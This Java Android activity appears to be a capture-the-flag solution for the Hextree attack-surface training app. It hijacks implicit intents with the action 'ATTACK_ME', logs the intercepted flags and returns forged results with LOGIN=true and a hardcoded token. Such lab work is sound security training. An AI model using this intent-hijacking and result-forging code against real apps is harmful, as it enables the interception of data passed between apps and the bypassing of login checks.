package com.poc.hextree;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class ImplicitActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_implicit_acitivity);

        flag12Solution();
    }



    private void flag12Solution() {
        // Get the incoming intent
        Intent intent = getIntent();
        Log.i("Received Intent", Utils.dumpIntent(this, intent));

        // Check if the action matches
        if ("io.hextree.attacksurface.ATTACK_ME".equals(intent.getAction())) {
            // Create the response intent
            Intent resultIntent = new Intent();
            resultIntent.putExtra("LOGIN", true); // LOGIN must be true
            resultIntent.putExtra("token", 1094795585); // Correct token
            setResult(42, resultIntent); // Send result back to Flag12Activity
            Log.i("Flag12Solution", "Returning result with LOGIN=true and token=1094795585");
            finish(); // Finish the activity
        }
    }

    private void flag11Solution(){
//        Respond to an Implicit intent
        Intent intent = getIntent();
        if ("io.hextree.attacksurface.ATTACK_ME".equals(intent.getAction())){
            String flag = intent.getStringExtra("flag");
            flag = flag != null ? flag : "null";
            Log.i("flag11Solution: ", flag );

            // it is important not to forget the finish() call as it ensures the setresult is sent back
            Intent intent2 = new Intent();
            intent2.putExtra("token",  1094795585);
            setResult(42,intent2);
            finish();

        }
    }

    private void flag10Solution() {
        // hijack an imlpicit intent and forward it to correct app
        // Retrieve the intent that started this activity
        Intent intent = getIntent();

        // Check if the intent action matches the one you're intercepting
        if ("io.hextree.attacksurface.ATTACK_ME".equals(intent.getAction())) {
            // Get the flag from the intent extras
            String flag = intent.getStringExtra("flag");

            if (flag != null) {
                // Log or display the flag
                Log.d("ImplicitActivity", "Intercepted Flag: " + flag);
                Toast.makeText(this, "Intercepted Flag: " + flag, Toast.LENGTH_LONG).show();

                // Optionally pass the flag or result back to the originating activity
                Intent resultIntent = new Intent();
                resultIntent.putExtra("capturedFlag", flag);
                setResult(RESULT_OK, resultIntent);
            } else {
                Toast.makeText(this, "No flag found in intent", Toast.LENGTH_SHORT).show();
            }
        } else {
            Toast.makeText(this, "Unexpected action: " + intent.getAction(), Toast.LENGTH_SHORT).show();
        }
        // Finish the activity after processing the intent
        finish();
    }
}